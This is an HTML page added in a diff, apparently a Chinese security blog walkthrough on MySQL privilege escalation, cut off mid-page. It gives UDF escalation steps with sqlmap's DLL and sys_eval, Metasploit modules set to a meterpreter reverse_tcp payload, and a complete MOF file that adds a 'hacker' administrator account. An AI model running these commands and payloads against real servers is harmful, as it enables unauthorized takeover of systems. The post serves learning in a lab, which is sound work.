@@ -1,0 +1,1053 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="yuBetter">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="preconnect" href="https://evan.beee.top" crossorigin>
+    
+        
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://example.com/2023/05/15/数据库提权/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="MySQL数据库提权主要是要通过mysql权限——&gt;进而获得操作系统权限 UDF提权UDF 全称user defined function 又叫 用户自定义函数，是通过添加新函数，实现mysql中无法通过函数实现功能的拓展，就比如MySQL没有这个函数，我们可以自己添加进去，然后就可以用我们自己添加的函数了 前提条件我们需要知道mysql数据库的用户名和密码，并且可以远程登录（相当于获得了M">
+<meta property="og:type" content="article">
+<meta property="og:title" content="数据库提权">
+<meta property="og:url" content="https://example.com/2023/05/15/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="MySQL数据库提权主要是要通过mysql权限——&gt;进而获得操作系统权限 UDF提权UDF 全称user defined function 又叫 用户自定义函数，是通过添加新函数，实现mysql中无法通过函数实现功能的拓展，就比如MySQL没有这个函数，我们可以自己添加进去，然后就可以用我们自己添加的函数了 前提条件我们需要知道mysql数据库的用户名和密码，并且可以远程登录（相当于获得了M">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417200508085.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417200538917.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417203102013.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417203205586.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417203254751.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417203537255.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417204509877.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417205832997.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417210024594.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417211718980.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417211838441.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417211910126.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417212016180.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417212029883.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418141726103.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418142239889.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418161347953.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418161455586.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418161326688.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418163725677.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418163825197.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418164047098.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418165759713.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418165827318.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418165918697.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418170435006.png">
+<meta property="article:published_time" content="2023-05-15T01:26:43.000Z">
+<meta property="article:modified_time" content="2023-05-15T01:29:41.098Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417200508085.png">
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/yubetter.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/yubetter.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/yubetter.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            数据库提权 -
+        
+        Yu&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/assets/fonts.css">
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    let Global = window.Global || {};
+    Global.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[""]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":false,"percentage":true},"busuanzi_counter":{"enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"pjax":true,"open_graph":true},"home_banner":{"enable":true,"image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"好好学习，天天向上","subtitle":{"text":["有远大志向而脚踏实地，有障碍失败而不言放弃","静以修生，俭以养德，非淡泊无以明志，非宁静无以致远","即使慢，驰而不息，纵会落后，纵会失败，但一定可以达到他所向的目标","穷且益坚，不坠青云之志","莫不有始，鲜克有终","靡不有初,鲜克有终"],"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/yuBetter","instagram":null,"zhihu":null,"twitter":null,"email":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.1.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":false,"position":"left","announcement":null,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}}};
+    Global.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/fontawesome/fontawesome.min.css">
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/fontawesome/brands.min.css">
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/fontawesome/solid.min.css">
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/fontawesome/regular.min.css">
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="main-content-container">
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Yu&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer">
+        <ul class="drawer-navbar-list">
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            
+             
+                <div class="article-title">         
+                    <img src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/backiee-129216.jpg" alt="数据库提权" />
+                    <h1 class="article-title-cover">数据库提权</h1>
+                </div>
+            
+                
+            
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/yubetter-logon.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">yuBetter</span>
+                            
+                                <span class="author-label"></span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-05-15 09:26:43</span>
+        <span class="mobile">2023-05-15 09:26</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-05-15 09:29:41</span>
+            <span class="mobile">2023-05-15 09:29</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>3.9k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>15 Mins</span>
+        </span>
+    
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content markdown-body">
+                <h2 id="MySQL数据库提权"><a href="#MySQL数据库提权" class="headerlink" title="MySQL数据库提权"></a>MySQL数据库提权</h2><p>主要是要通过mysql权限——&gt;进而获得操作系统权限</p>
+<h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><p>UDF 全称user defined function 又叫 用户自定义函数，是通过添加新函数，实现mysql中无法通过函数实现功能的拓展，就比如MySQL没有这个函数，我们可以自己添加进去，然后就可以用我们自己添加的函数了</p>
+<h4 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h4><p>我们需要知道mysql数据库的用户名和密码，并且可以远程登录（相当于获得了MySQL数据库权限）</p>
+<p>mysql具有写入文件的权限：就是secure_file_priv的值为空</p>
+<p>但是在这些操作之前需要知道，一般MySQL数据库只允许本地登入，虽然在知道账号密码的情况下我们可以通过navicat连接，但是如果只能本地连接的话就要去获得高权限来获得rdp远程连接的权限</p>
+<p>我们可以通过更改mysql配置文件来开启远程登陆</p>
+<p>在mysql目录下&#x2F;etc&#x2F;mysql&#x2F;my.conf文件，将bind-address&#x3D;127.0.0.1改成0.0.0.0</p>
+<p>但是还有账号限制，需要给远程登陆用户赋予权限，首先可以创建一个admin&#x2F;123456用户，使用%来允许任意IP登陆</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant all on *.* to admin@&#x27;%&#x27; identified by &#x27;123456&#x27; with grant option;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>另外：mysql提权后获得的最大权限是和服务器登入的账号有关的，如果是普通账号登入的话最大权限也只能是普通账户权限，如果是管理员登入的话，提权后就是系统管理员权限</p>
+<h4 id="手动提权"><a href="#手动提权" class="headerlink" title="手动提权"></a>手动提权</h4><p>先查看MySQL是否具有写入文件的权限</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure></div>
+
+<p>secure_file_priv是用来限制load、dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取文件的权限</p>
+<p>secure_file_priv值为null 表示不允许导入导出</p>
+<p>secure_file_priv值为&#x2F;tmp&#x2F;，表示限制导入，导出只能在&#x2F;tmp&#x2F;目录下</p>
+<p>secure_file_priv值为空，则不限制</p>
+<p>这个表示不允许导入导出</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417200508085.png"
+                      alt="image-20230417200508085"
+                ></p>
+<p>这个表示不做任何限制</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417200538917.png"
+                      alt="image-20230417200538917"
+                ></p>
+<p>如何更改，在mysql目录中my.ini在最后添加一行<code>secure_file_priv=&#39;&#39;</code>即可，重启apache服务即可</p>
+<p>接下来我们就要上传UDF动态链接库文件</p>
+<p>所谓的动态链接库文件就是一种实现共享函数库的一种方式，在Windows环境下后缀名为.dll，linux环境就是.so，文件包含执行系统命令的一些函数</p>
+<p>那这个文件在哪？？？？</p>
+<p>这个文件在sqlmap、msf中都有的其实</p>
+<p>具体目录在\sqlmap\data\udf\mysql里面有linux和windows的32位、64位版本，我们需要知道数据库服务器用哪个版本系统，执行以下命令查询</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@version_compile_os, @@version_compile_machine;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417203102013.png"
+                      alt="image-20230417203102013"
+                ></p>
+<p>我这个是Windows64位的所以就上传Windows 64位的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417203205586.png"
+                      alt="image-20230417203205586"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417203254751.png"
+                      alt="image-20230417203254751"
+                ></p>
+<p>可以看出，这里的文件是.dll_结尾的，这是由于sqlmap为了防止被误杀经过了编码处理，不能别直接使用，需要解码，在sqlmap自带解码py脚本在\sqlmap\extra\cloak下</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417203537255.png"
+                      alt="image-20230417203537255"
+                ></p>
+<p>执行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cloak.py -d -i lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll</span><br></pre></td></tr></table></figure></div>
+
+<p>即可</p>
+<p>解码后的文件就恶意上传了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417204509877.png"
+                      alt="image-20230417204509877"
+                ></p>
+<p>Mysql版本小于5.1：<br>如果是 win 2000 的服务器，我们则需要将 udf.dll 文件导到 C:\Winnt\udf.dll 下。<br>如果是 win2003 服务器，我们则要将 udf.dll 文件导出在 C:\Windows\udf.dll 下。</p>
+<p>这里说一下为什么一定要是system32目录下。因为在MYSQL5之后，对DLL注册做了限制，所对应的DLL不能包含’&#x2F;‘或者’’，也就是说不能是绝对路径，所以这里我们放到system32系统环境变量中直接调用，可以规避这个限制</p>
+<p>Mysql版本大于5.1，udf.dll文件必须放在MySQL安装目录的lib\plugin文件夹下。（plugin文件夹默认不存在，需要创建）。</p>
+<p>我们的数据库版本大于5.1需要创建一个plugin文件夹，但是我们只是获得mysql权限，怎么在他的系统下创建文件夹</p>
+<p>可以利用NTFS流进行创建</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;xxx&#x27; into dumpfile &#x27;E:\phpstudy\phpstudy_pro\Extensions\MySQL5.7.26\lib\plugin::$INDEX_ALLOCATION&#x27;;</span><br></pre></td></tr></table></figure></div>
+
+<p>但是报错了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417205832997.png"
+                      alt="image-20230417205832997"
+                ></p>
+<p>自己创一个吧……..</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;plugin%&#x27;;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417210024594.png"
+                      alt="image-20230417210024594"
+                ></p>
+<p>然后就可以将刚才的.dll文件放到plugin里面了</p>
+<p>执行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select hex(load_file(&#x27;C:\\Windows\\System32\\cmd.exe\\lib_mysqludf_sys_64.dll&#x27;)) into dumpfile &#x27;E:\\phpstudy\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin&#x27;;</span><br><span class="line"></span><br><span class="line">这里windows下目录结构要进行转义双写</span><br></pre></td></tr></table></figure></div>
+
+<p>不行！！！直接拖进去吧，唉~~</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417211718980.png"
+                      alt="image-20230417211718980"
+                ></p>
+<p>那个方法说是可能传输不全可以用十六进制来</p>
+<p>那个代码网站贴这了</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html" >https://www.sqlsec.com/tools/udf.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>上传之后执行以下指令，创建自定义函数</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27;;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417211838441.png"
+                      alt="image-20230417211838441"
+                ></p>
+<p>查看是否创建成功</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from mysql.func;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417211910126.png"
+                      alt="image-20230417211910126"
+                ></p>
+<p>然后就可以执行这个函数，用来执行系统命令了</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417212016180.png"
+                      alt="image-20230417212016180"
+                ></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(&#x27;ipconfig&#x27;);</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417212029883.png"
+                      alt="image-20230417212029883"
+                ></p>
+<p>攻击者可以利用生成的dl文件提供的函数执行系统命令。</p>
+<p>sys_eval，执行任意命令，并将输出返回。</p>
+<p>sys_exec，执行任意命令，并将退出码返回。</p>
+<p>sys_get，获取一个环境变量。</p>
+<p>sys_set，创建或修改一个环境变量。</p>
+<p>全部流程就这样结束了</p>
+<p>总结以下：</p>
+<p>主要步骤就是获取数据库权限—–&gt;判断mysql版本 大于5.1还需要创建pliugin文件夹（失败了）—–&gt;然后就可以写入自定义函数—–&gt;之后就可以用自定义函数执行系统命令了</p>
+<p>这个自定义函数主要工作原理就是调用udf.dll里面的指令执行的，udf.dll里面包含了一些执行系统命令的一些函数</p>
+<p>这个sys_eval相当于一个壳用这个来调用udf.dll执行里面的系统指令</p>
+<h4 id="MSF进行数据库提权"><a href="#MSF进行数据库提权" class="headerlink" title="MSF进行数据库提权"></a>MSF进行数据库提权</h4><p>一样的，数据库root用户一般不开启外联，所以需要执行命令开启外联</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant all on *.* to root@&#x27;%&#x27; identified by &#x27;root&#x27; with grant option;</span><br></pre></td></tr></table></figure></div>
+
+<p>然后利用MSF中的exploit&#x2F;multi&#x2F;mysql&#x2F;mysql_udf_payload模块进行UDF提权</p>
+<p>主要利用的步骤</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/mysql/mysql_udf_payload</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set 账号 密码</span><br><span class="line">set rhost 对方IP</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
+
+<p>主要就是MSF的UDF模块会向目录里面导入一个.dll文件，会自动插入mysql库的func里面，如果mysql版本大于5.1就得手动创建一个&#x2F;lib&#x2F;plugin文件夹</p>
+<p>其他的步骤都和上面手动利用一样了，就不多赘述</p>
+<h4 id="MySQL启动项提权"><a href="#MySQL启动项提权" class="headerlink" title="MySQL启动项提权"></a>MySQL启动项提权</h4><p>启动项提权主要也是利用MSF中的攻击模块进行的，这个也需要开启外联权限</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/mysql/mysql_start_up</span><br><span class="line">set rhosts 对方IP地址</span><br><span class="line">set username 账号</span><br><span class="line">set password 密码</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
+
+<p>然后只需要等待数据库服务器重启就可以连接上了</p>
+<p>主要原理就是在目标服务的启动项里写入RoNuO.exe执行文件，当服务重启时，这个文件也会被调用启动，然后就可以反弹shell至攻击机了</p>
+<h3 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h3><p>MOF是Windows系统的一个文件，位于c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof，中文名叫做托管对象格式，作用就是每五秒就会去监控进程的创建和死亡</p>
+<p>mof提权原理主要就是我们拿到了数据库的root权限之后就可以上传我们自己的mof文件，且root权限可以执行我们上传的mof，一定时间后mof就会被执行，其中有一段是vbs脚本，里面大多数是利用cmd添加管理员的命令</p>
+<p>其实MOF提权并不局限于mysql数据库，这里，mysql数据库只是一个让我们向mof目录写入mof文件的一个桥梁，其他的可以达到同样目的的也可以造成mof提权</p>
+<h4 id="手动利用"><a href="#手动利用" class="headerlink" title="手动利用"></a>手动利用</h4><p>前提已经拿到网站的shell，发现数据库</p>
+<p>首先我们需要利用webshell工具把test.mof文件上传到www文件夹下</p>
+<p>代码如下</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;; </span><br><span class="line">    Name  = &quot;filtP2&quot;; </span><br><span class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot; </span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; </span><br><span class="line">            &quot;And TargetInstance.Second = 5&quot;; </span><br><span class="line">    QueryLanguage = &quot;WQL&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name = &quot;consPCSV2&quot;; </span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;; </span><br><span class="line">    ScriptText = </span><br><span class="line">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hacker P@ssw0rd /add\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators hacker /add\&quot;)&quot;;</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = $Consumer; </span><br><span class="line">    Filter = $EventFilter; </span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>还是得查看secure_file_priv的参数，看看mysql是否被允许导出文件</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;secure_file_priv&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>是空就行</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418141726103.png"
